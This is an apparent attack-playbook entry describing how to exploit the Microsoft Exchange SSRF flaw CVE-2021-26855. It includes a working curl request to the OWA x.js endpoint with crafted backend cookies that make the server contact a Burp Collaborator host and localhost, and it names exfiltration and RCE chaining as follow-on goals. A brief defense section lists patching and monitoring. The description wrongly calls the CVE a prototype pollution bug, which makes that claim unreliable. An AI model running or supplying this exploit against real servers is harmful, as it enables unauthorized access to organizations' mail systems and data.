---
id: proc-uuid-123
tags:
  - ssrf
  - exchange
  - cve-2021-26855
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-ssrf-exploit-exchange]]'
verified: false
platforms:
  - Web
  - Microsoft Exchange Server
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:02.375Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-via-Crafted-HTTP-Request-to-OWA-Endpoint

## Summary

This procedure exploits CVE-2021-26855 in Microsoft Exchange Server to perform Server-Side Request Forgery (SSRF) by sending a crafted HTTP GET request to the /owa/auth/x.js endpoint with manipulated cookies, tricking the server into requesting external or internal resources controlled by the attacker.

## Description

CVE-2021-26855 is a prototype pollution vulnerability in Exchange that allows remote code execution, but in this context, it's used to achieve SSRF. The attack targets the OWA authentication endpoint, injecting payloads via cookies like X-AnonResource-Backend to redirect server requests to arbitrary URLs, such as an external collaborator service for out-of-band confirmation or internal localhost for pivoting. This was demonstrated on a U.S. Department of Defense Exchange server, potentially enabling data exfiltration or further compromise. Prerequisites include identifying the vulnerable server via scanning and having an OOB listener ready.

## Requirements

1. Network access to the target Exchange server's HTTPS port (443)
2. Knowledge of the target's hostname (e.g., via reconnaissance or vulnerability scanners)
3. Attacker-controlled domain for SSRF confirmation (e.g., Burp Collaborator)
4. Tools: curl for request crafting and Burp Collaborator for OOB detection

## Defense

Defensive measures and detection strategies:

- Patch Microsoft Exchange to the latest version to mitigate CVE-2021-26855
- Implement web application firewall (WAF) rules to block anomalous cookie values in OWA requests
- Monitor outbound network traffic for unexpected DNS/HTTP requests to unknown domains
- Enable logging for Exchange OWA endpoints and alert on requests to /owa/auth/x.js with suspicious headers/cookies

## Objectives

1. Coerce the server into making unauthorized outbound requests to confirm SSRF
2. Demonstrate potential for internal resource access via localhost redirects
3. Lay groundwork for further exploitation like data exfiltration or RCE chaining

## Instructions

### Step 1: Prepare OOB Listener

**Context**: Set up Burp Collaborator to capture interactions from the target server, confirming SSRF success.

Launch Burp Suite and generate a unique Collaborator payload (e.g., burpcollaborator.net subdomain).

### Step 2: Craft and Send Exploit Request

**Context**: Use a mimicked browser request to the vulnerable endpoint, injecting SSRF payloads into cookies to force server-side fetches.

**Command** ([[commands/curl-ssrf-exploit-exchange]]):
```bash
curl -i -s -k -X $'GET' -H $'Host: █████' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' $'https://████████/owa/auth/x.js'
```

> This command sends a GET request mimicking a Firefox browser, with cookies set to true for anonymous resources and backend redirects to the Collaborator URL for external SSRF, plus a localhost path for internal testing. Expected output includes HTTP headers and body from the server; success is validated by checking Burp Collaborator for inbound polls.

### Step 3: Validate SSRF

**Context**: Confirm the exploit by reviewing OOB interactions.

Check Burp Collaborator for DNS resolutions or HTTP requests originating from the target's IP, indicating the server followed the injected URLs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-ssrf-exploit-exchange]]

## Tools Used

- [[tools/curl]]
- [[tools/Burp-Collaborator]]

## Tags

- ssrf
- exchange
- cve-2021-26855
